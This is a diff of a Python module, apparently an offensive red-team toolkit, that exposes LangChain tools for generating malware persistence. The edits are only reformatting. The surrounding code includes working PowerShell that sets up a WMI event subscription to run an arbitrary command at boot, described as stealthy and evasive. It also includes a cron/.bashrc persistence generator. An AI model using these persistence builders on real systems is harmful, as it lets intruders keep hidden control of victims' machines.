@@ -1,10 +1,6 @@
-import json
-import asyncio
-import os
-import platform
-from datetime import datetime
-from myth_config import load_dotenv
 from langchain_core.tools import tool
+
+from myth_config import load_dotenv
 from tools.utilities.report import format_industrial_result
 
 load_dotenv()
@@ -12,6 +8,7 @@ load_dotenv()
 # ==============================================================================
 # 👻 Advanced Red Team Persistence Tools
 # ==============================================================================
+
 
 @tool
 async def persistence_script_generator(command: str, os_type: str = "windows") -> str:
@@ -23,7 +20,7 @@ async def persistence_script_generator(command: str, os_type: str = "windows") -
     try:
         script = ""
         is_windows = os_type.lower() == "windows"
-        
+
         if is_windows:
             script = f"""@echo off
 REM MYTH Persistence Loader
@@ -65,21 +62,26 @@ echo "[+] Persistence installed via Cron and .bashrc"
             confidence=1.0,
             impact="CRITICAL",
             raw_data={"os": os_type, "script": script},
-            summary=f"Generated auto-scaling persistence script for {os_type}."
+            summary=f"Generated auto-scaling persistence script for {os_type}.",
         )
     except Exception as e:
-        return format_industrial_result("persistence_script_generator", "Error", error=str(e))
+        return format_industrial_result(
+            "persistence_script_generator", "Error", error=str(e)
+        )
+
 
 @tool
-async def wmi_persistence_builder(command: str, trigger_name: str = "OMEGA_SYNC") -> str:
+async def wmi_persistence_builder(
+    command: str, trigger_name: str = "OMEGA_SYNC"
+) -> str:
     """
     Generates stealthy WMI Event Subscription persistence for Windows.
     Bypasses many standard startup inspections by running in the context of WmiPrvSE.
     """
     try:
         # Sanitize trigger name
-        safe_name = "".join(c for c in trigger_name if c.isalnum() or c == '_')
-        
+        safe_name = "".join(c for c in trigger_name if c.isalnum() or c == "_")
+
         ps_script = f"""
 $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ Name = '{safe_name}'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime < 100"; QueryLanguage = "WQL" }}
 $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ Name = '{safe_name}'; CommandLineTemplate = '{command}' }}
@@ -91,7 +93,9 @@ Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -
             confidence=1.0,
             impact="HIGH",
             raw_data={"powershell_payload": ps_script.strip()},
-            summary=f"Advanced WMI persistence sequence constructed for {safe_name}. Command: {command}."
+            summary=f"Advanced WMI persistence sequence constructed for {safe_name}. Command: {command}.",
         )
     except Exception as e:
-        return format_industrial_result("wmi_persistence_builder", "Error", error=str(e))
+        return format_industrial_result(
+            "wmi_persistence_builder", "Error", error=str(e)
+        )
